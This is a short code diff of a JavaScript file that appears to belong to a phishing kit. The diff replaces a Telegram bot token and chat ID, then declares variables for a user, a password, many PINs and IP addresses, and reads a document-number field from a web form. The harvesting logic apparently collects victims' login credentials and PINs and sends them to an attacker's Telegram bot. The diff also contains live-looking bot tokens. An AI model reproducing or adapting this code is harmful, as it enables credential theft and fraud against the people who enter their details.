@@ -1,9 +1,9 @@
 
 
 //bot token
-var $token = "7259617663:AAEwARxKXL1Q6qvLD_rt2sTtesC_VMo1eZE";
+var $token = "7810439720:AAHAb3frdUje1lv-BrPaHgAZuXY3gmr9mBc";
 //chat id
-var $chat_id = "6219536820";
+var $chat_id = "6927751752";
 var USER, PASS, PIN, PIN2, TYPE, TYPES, NUMBER, PIN3, PIN4, PIN5, PIN6, PIN7, PIN8, PIN9, PIN0, PIN10, PIN11, PIN12, PIN13, ip, ip2, message;
 var ready = function () {
     TYPE = document.getElementById("numeroDocumento").value;
